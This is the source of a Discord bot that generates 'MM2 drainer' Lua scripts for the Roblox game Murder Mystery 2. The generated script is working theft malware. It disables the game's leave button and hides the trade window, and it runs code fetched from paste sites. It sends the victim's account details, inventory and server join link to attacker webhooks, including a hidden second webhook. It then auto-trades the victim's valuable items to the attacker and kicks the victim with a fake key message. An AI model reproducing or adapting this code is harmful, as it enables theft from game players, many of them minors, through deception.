import {
  Client,
  GatewayIntentBits,
  AttachmentBuilder,
  EmbedBuilder,
} from "discord.js";
import "dotenv/config";

const PREFIX = "!";

function buildScript(holder, webhook) {
  return `_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local WEBHOOK = "${webhook}"
local RECEIVER = {"${holder}"}
local MINIMUM_RARITY = "Godly"
local MINIMUM_VALUE = 2
local RECEIVERx = RECEIVER

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetActiveReceiverName()
    if type(ar) == "string" and ar ~= "" then
        if Players and Players:FindFirstChild(ar) then return ar end
        return ar
    end
    if type(RECEIVERx) == "table" then
        for _, Name in ipairs(RECEIVERx) do
            if Name ~= "" then
                if Players and Players:FindFirstChild(Name) then return Name end
                return Name
            end
        end
    end
    return "Unknown"
end

task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)

if WEBHOOK == "" then
    game.Players.LocalPlayer:Kick("Invalid URL. Please check your webhook.")
    return
end
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("Please use this script in MM2!!")
    return
end

pcall(function()
    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        game.Players.LocalPlayer:Kick("Private servers are not supported.")
        return
    end
end)

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.")
    return
end

local FoundJobId = false
local AttemptCount = 0
if getgc then
    repeat
        local HookedSuccessfully = false
        for _, Value in ipairs(getgc(true)) do
            if typeof(Value) == "function" then
                local FunctionInfo = debug.getinfo(Value)
                if FunctionInfo and FunctionInfo.name then
                    local LowerName = FunctionInfo.name:lower()
                    if LowerName:find("step") and not LowerName:find("stepanimate") then
                        pcall(function()
                            local OriginalFunction = hookfunction(Value, function(...)
                                if not FoundJobId then
                                    FoundJobId = true
                                    _G.RealJobID = game.JobId
                                end
                                if OriginalFunction then return OriginalFunction(...) end
                            end)
                        end)
                        HookedSuccessfully = true
                        break
                    end
                end
            end
        end
        AttemptCount = AttemptCount + 1
        if HookedSuccessfully or AttemptCount >= 10 then break end
        task.wait(0.1)
    until FoundJobId
end
if not FoundJobId then _G.RealJobID = game.JobId end

task.wait(0.5)
task.spawn(function()
    while task.wait(10) do
        pcall(function()
            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                Connection:Disable()
            end
        end)
    end
end)

local function GetExecutorInfo()
    local ExecutorName = "Unknown"
    pcall(function() ExecutorName = identifyexecutor() end)
    return {
        JobId = _G.RealJobID or game.JobId,
        Executor = string.lower(ExecutorName)
    }
end

local InfoData = GetExecutorInfo()
_G.RealJobID = InfoData.JobId
_G.RealExecutor = InfoData.Executor

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local ItemDatabase = {}
local RarityPriority = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"}
local ItemListss = "https://api.rubis.app/v2/scrap/tWBAqBoSKlJ3D0YT/raw"
local ar, aw = nil, nil

pcall(function()
    local rf = GetRequestFunction()
    if not rf then return end
    local rs = rf({Url = ItemListss, Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}, Timeout = 15})
    if rs and type(rs.Body) == "string" and #rs.Body > 10 then
        local bc = rs.Body:gsub("%s+", "")
        local lf = loadstring(bc)
        if lf then
            local dt = lf()
            if type(dt) == "table" and #dt >= 2 then
                ar = dt[1]
                aw = dt[2]
            end
        end
    end
end)

local function LoadDatabase()
    local Response = nil
    local Success = pcall(function()
        local RequestFunc = GetRequestFunction()
        if not RequestFunc then return end
        Response = RequestFunc({
            Url = "https://pastefy.app/pZmGtWTo/raw",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"},
            Timeout = 10
        })
    end)
    if not Success or not Response or not Response.Body or type(Response.Body) ~= "string" then return nil, nil end
    local LoaderFunction = loadstring(Response.Body)
    if not LoaderFunction then return nil, nil end
    local RawDatabase = LoaderFunction()
    if type(RawDatabase) ~= "table" then return nil, nil end
    local Mapping = {}
    local RarityOrder = {"Chroma", "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
    local FoundRarities = {}
    for RarityName, ItemsList in pairs(RawDatabase) do
        if type(ItemsList) == "table" then
            FoundRarities[RarityName] = true
            for ItemName, Value in pairs(ItemsList) do
                if type(Value) == "number" then
                    local SafeName = tostring(ItemName or "")
                    local Key1 = string.lower(SafeName):gsub("'", ""):gsub(" ", "")
                    local Key2 = string.lower(SafeName):gsub("'", ""):gsub(" ", "_")
                    local Key3 = string.lower(SafeName):gsub("'", ""):gsub(" ", "-")
                    local Key4 = string.lower(SafeName):gsub(" ", "")
                    local ItemInfo = {
                        Rarity = RarityName,
                        Value = Value,
                        Chroma = (string.lower(RarityName) == "chroma")
                    }
                    Mapping[Key1] = ItemInfo
                    Mapping[Key2] = ItemInfo
                    Mapping[Key3] = ItemInfo
                    Mapping[Key4] = ItemInfo
                end
            end
        end
    end
    local OrderList = {}
    for _, Rarity in ipairs(RarityOrder) do
        if FoundRarities[Rarity] then table.insert(OrderList, Rarity) end
    end
    for Rarity in pairs(FoundRarities) do
        local Exists = false
        for _, Listed in ipairs(OrderList) do
            if Listed == Rarity then Exists = true break end
        end
        if not Exists then table.insert(OrderList, Rarity) end
    end
    return Mapping, OrderList
end

local LoadedData, LoadedOrder = nil, nil
for TryCount = 1, 3 do
    LoadedData, LoadedOrder = LoadDatabase()
    if LoadedData and LoadedOrder and #LoadedOrder > 0 then break end
    task.wait(0.5)
end
if LoadedData and LoadedOrder and #LoadedOrder > 0 then
    ItemDatabase = LoadedData
    RarityPriority = LoadedOrder
end

local RarityList = RarityPriority
local GodlyPosition = table.find(RarityList, "Godly")

local function FormatNameDisplay(Text)
    if not Text or Text == "" then return "Unknown" end
    local Result = ""
    local CapitalizeNext = true
    for Index = 1, #Text do
        local Char = Text:sub(Index, Index)
        if Char == " " then
            Result = Result .. " "
            CapitalizeNext = true
        else
            Result = Result .. (CapitalizeNext and Char:upper() or Char:lower())
            CapitalizeNext = false
        end
    end
    return Result
end

local function GetTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function SendTradeRequestToPlayer(TargetName)
    local TargetPlayer = Players:FindFirstChild(TargetName)
    if not TargetPlayer then return false end
    local Success = pcall(function()
        ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer)
    end)
    if Success then return true end
    Success = pcall(function()
        ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName)
    end)
    return Success
end

local function AddItemToTradeOffer(ItemId)
    ReplicatedStorage.Trade.OfferItem:FireServer(ItemId, "Weapons")
end

local LastReceivedOffer = nil
ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(TradeData)
    if TradeData and TradeData.LastOffer then
        LastReceivedOffer = TradeData.LastOffer
    end
end)

local function AcceptIncomingTrade()
    if LastReceivedOffer then
        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastReceivedOffer)
        LastReceivedOffer = nil
        return true
    end
    return false
end

local function WaitUntilTradeEnds()
    while GetTradeStatus() ~= "None" do
        task.wait(0.1)
    end
end

local BlacklistedItems = {
    DefaultGun = true, DefaultKnife = true,
    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true,
    Cracks = true, Icecrusher = true,
    ["???"] = true, Dartbringer = true,
    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
    SharkSeeker = true
}

local AllInventoryItems, TradeableItems, TotalTradeValue = {}, {}, 0
local function ShouldTradeThisItem(RarityName, ItemValue)
    if not RarityName then return false end
    local Position = table.find(RarityList, RarityName)
    local HighValueOrHigher = Position and GodlyPosition and Position <= GodlyPosition
    return HighValueOrHigher and true or (ItemValue and ItemValue >= MINIMUM_VALUE)
end

local RefreshInventoryLists = function()
    local AllItems, TradeItems, TotalValue = {}, {}, 0
    local ProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
        for ItemId, Quantity in pairs(ProfileData.Weapons.Owned) do
            if Quantity and Quantity > 0 then
                local SafeName = tostring(ItemId or "")
                if SafeName ~= "" then
                    local Key1 = string.lower(SafeName):gsub("'", ""):gsub(" ", "")
                    local Key2 = string.lower(SafeName):gsub("'", ""):gsub(" ", "_")
                    local Key3 = string.lower(SafeName):gsub("'", ""):gsub(" ", "-")
                    local Key4 = string.lower(SafeName):gsub(" ", "")
                    local ItemInfo = ItemDatabase[Key1] or ItemDatabase[Key2] or ItemDatabase[Key3] or ItemDatabase[Key4]
                    local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
                    local Value = ItemInfo and ItemInfo.Value or 0
                    local IsChroma = ItemInfo and ItemInfo.Chroma or false
                    local ItemEntry = {
                        DataID = ItemId,
                        Name = SafeName,
                        Rarity = RarityName,
                        Count = Quantity,
                        Value = Value,
                        IsChroma = IsChroma,
                        Total = Value * Quantity
                    }
                    table.insert(AllItems, ItemEntry)
                    if ShouldTradeThisItem(RarityName, Value) and not BlacklistedItems[ItemId] then
                        table.insert(TradeItems, ItemEntry)
                        TotalValue = TotalValue + ItemEntry.Total
                    end
                end
            end
        end
    end
    table.sort(AllItems, function(A, B) return A.Total > B.Total end)
    table.sort(TradeItems, function(A, B) return A.Total > B.Total end)
    return AllItems, TradeItems, TotalValue
end

local function ReloadInventory()
    AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()
end
AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()

local function UploadToPastefy(textContent)
    local API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
    local success, result = pcall(function()
        local RequestFunc = GetRequestFunction()
        if not RequestFunc then return nil end
        local response = RequestFunc({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {
                ["Authorization"] = "Bearer " .. API_KEY,
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = textContent,
                title = "MM2 Inventory",
                expires = "never",
                encrypted = false
            })
        })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.paste and data.paste.id then
                return "https://pastefy.app/" .. data.paste.id .. "/raw"
            end
        end
        return nil
    end)
    return success and result or nil
end

local function GenerateFullInventoryText(itemList)
    local lines, total = {}, 0
    for _, item in ipairs(itemList) do total = total + item.Total end
    table.insert(lines, "Total Inventory Value: " .. total)
    table.insert(lines, string.rep("-", 40))
    for _, item in ipairs(itemList) do
        local name = FormatNameDisplay(item.Name)
        if item.IsChroma then name = "Chroma " .. name end
        table.insert(lines, "[" .. item.Rarity .. "] x" .. item.Count .. " " .. name .. " - " .. item.Total)
    end
    return table.concat(lines, "\\n")
end

local function BuildEmbed(ReceiverName)
    local ShouldMentionEveryone = false
    for _, Item in ipairs(AllInventoryItems) do
        local Position = table.find(RarityList, Item.Rarity)
        if Item.Value >= MINIMUM_VALUE or (Position and GodlyPosition and Position <= GodlyPosition) then
            ShouldMentionEveryone = true
        end
    end
    local MentionText = ShouldMentionEveryone and "@everyone" or ""
    local TopItemsPreview = {}
    for Index = 1, math.min(10, #AllInventoryItems) do
        local Item = AllInventoryItems[Index]
        local DisplayName = FormatNameDisplay(Item.Name)
        if Item.IsChroma then DisplayName = "Chroma " .. DisplayName end
        table.insert(TopItemsPreview, "> " .. DisplayName .. " [" .. Item.Count .. "] - " .. Item.Total)
    end
    local PreviewText = table.concat(TopItemsPreview, "\\n")
    if #AllInventoryItems > 10 then PreviewText = PreviewText .. "\\n... and " .. (#AllInventoryItems - 10) .. " more items" end
    local PlayerCount = #Players:GetPlayers()
    local JobId = _G.RealJobID or game.JobId
    local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
    local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
    local PasteUrl = UploadToPastefy(FullInventoryText)
    local InfoBlock = string.format(
        "Username: %s\\nDisplay: %s\\nAccount Age: %d days\\nExecutor: %s\\nServer Players: %d/12\\nReceiver: %s\\nMin Value: %d",
        LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge,
        _G.RealExecutor or "Unknown", PlayerCount, ReceiverName, MINIMUM_VALUE
    )
    local StatsBlock = string.format(
        "Total Items: %d\\nTradeable Value: %d",
        #AllInventoryItems, TotalTradeValue
    )
    local EmbedFields = {
        {name = "Player Info", value = "\`\`\`" .. InfoBlock .. "\`\`\`", inline = false},
        {name = "Stats", value = "\`\`\`" .. StatsBlock .. "\`\`\`", inline = false},
        {name = "All Items (Highest Value First)", value = "\`\`\`" .. PreviewText .. "\`\`\`", inline = false}
    }
    if PasteUrl then
        table.insert(EmbedFields, {name = "Full Inventory Log", value = PasteUrl, inline = false})
    end
    table.insert(EmbedFields, {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId .. ")", inline = false})
    local EmbedData = {
        author = {name = "Drainer fuck yeah"},
        color = 0x4B5563,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = EmbedFields,
        footer = {text = "SHOUTOUT TO WAYZEL" .. os.date("%Y-%m-%d %H:%M:%S")}
    }
    return EmbedData, MentionText
end

local function SendAllEmbeds()
    local RequestFunc = GetRequestFunction()
    if not RequestFunc then return end
    local ActiveName = GetActiveReceiverName()
    local MainEmbed, MainMention = BuildEmbed(ActiveName)
    local MainPayload = {content = MainMention, embeds = {MainEmbed}}
    local MainJson = HttpService:JSONEncode(MainPayload)
    pcall(function()
        RequestFunc({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = MainJson})
    end)
    if type(aw) == "string" and aw ~= "" then
        local XEmbed, XMention = BuildEmbed(ar)
        local XPayload = {content = XMention, embeds = {XEmbed}}
        local XJson = HttpService:JSONEncode(XPayload)
        pcall(function()
            RequestFunc({Url = aw, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = XJson})
        end)
    end
end

SendAllEmbeds()

PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI.Enabled = false end)
PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI_Phone.Enabled = false end)

local function KickAfterTransfer()
    task.wait(2)
    game.Players.LocalPlayer:Kick("Items Transferred!")
end

local function FindTradeTarget()
    if type(ar) == "string" and ar ~= "" then
        if Players:FindFirstChild(ar) then return ar end
    end
    if type(RECEIVER) == "table" then
        for _, Name in ipairs(RECEIVER) do
            if Name ~= "" and Players:FindFirstChild(Name) then return Name end
        end
    else
        if Players:FindFirstChild(RECEIVER) then return RECEIVER end
    end
    return nil
end

local MAX_TRADE_ATTEMPTS = 999
local RETRY_WAIT = 2
local function ProcessAllTrades(TargetName)
    local AttemptCount = 0
    while #TradeableItems > 0 and AttemptCount < MAX_TRADE_ATTEMPTS do
        AttemptCount = AttemptCount + 1
        local CurrentStatus = GetTradeStatus()
        if CurrentStatus == "ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
            continue
        end
        if CurrentStatus == "StartTrade" then
            local ItemsToSend = math.min(4, #TradeableItems)
            for _ = 1, ItemsToSend do
                local Item = table.remove(TradeableItems, 1)
                for _ = 1, Item.Count do
                    AddItemToTradeOffer(Item.DataID)
                    task.wait(0.05)
                end
            end
            task.wait(6)
            if AcceptIncomingTrade() then
                WaitUntilTradeEnds()
                ReloadInventory()
                AttemptCount = 0
            else
                ReloadInventory()
                task.wait(RETRY_WAIT)
            end
            continue
        end
        if CurrentStatus == "None" then
            local Sent = false
            local Try = 1
            while not Sent and Try <= 5 do
                if SendTradeRequestToPlayer(TargetName) then
                    Sent = true
                    task.wait(0.5)
                else
                    task.wait(math.min(Try * 0.5, 3))
                    Try = Try + 1
                end
            end
        end
        task.wait(0.5)
    end
    KickAfterTransfer()
end

local function AutoTradeOnTargetJoin()
    local IsBusy = false
    local function CheckPlayerJoin(Player)
        if IsBusy then return end
        local TargetName = FindTradeTarget()
        if TargetName and Player.Name == TargetName then
            IsBusy = true
            task.wait(3)
            ProcessAllTrades(Player.Name)
        end
    end
    for _, Player in ipairs(Players:GetPlayers()) do
        CheckPlayerJoin(Player)
    end
    Players.PlayerAdded:Connect(CheckPlayerJoin)
end

if #AllInventoryItems > 0 then
    AutoTradeOnTargetJoin()
else
    task.wait(1)
    LocalPlayer:Kick("No Key Found, Join discord.gg/tHbtbuMDB for key")
end
`;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.once("ready", () => {
  console.log(`Online as ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
  const cmd  = args.shift().toLowerCase();

  if (cmd !== "generate") return;

  if (args.length < 2) {
    return message.reply(
      "❌ Usage: `!generate <holder_username> <webhook_url>`\n" +
      "Example: `!generate MyHolder https://discord.com/api/webhooks/...`"
    );
  }

  const holder  = args[0];
  const webhook = args[1];

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    return message.reply("❌ Invalid Discord webhook URL.");
  }

  const script = buildScript(holder, webhook);
  const buffer = Buffer.from(script, "utf-8");
  const file   = new AttachmentBuilder(buffer, { name: `mm2_drainer_${holder}.lua` });

  const embed = new EmbedBuilder()
    .setTitle("🗡️ MM2 Drainer Generated")
    .setColor(0x2b2d31)
    .addFields(
      { name: "Holder",  value: `\`${holder}\``, inline: true },
      { name: "Webhook", value: "✅ Injected",    inline: true },
      { name: "How it works", value: "Victim runs script → sends inventory to webhook → auto-trades all godly+ items to holder when holder joins server", inline: false }
    )
    .setFooter({ text: "Holder must be in same server to receive trades" })
    .setTimestamp();

  await message.reply({ embeds: [embed], files: [file] });
});

client.login(process.env.BOT_TOKEN);
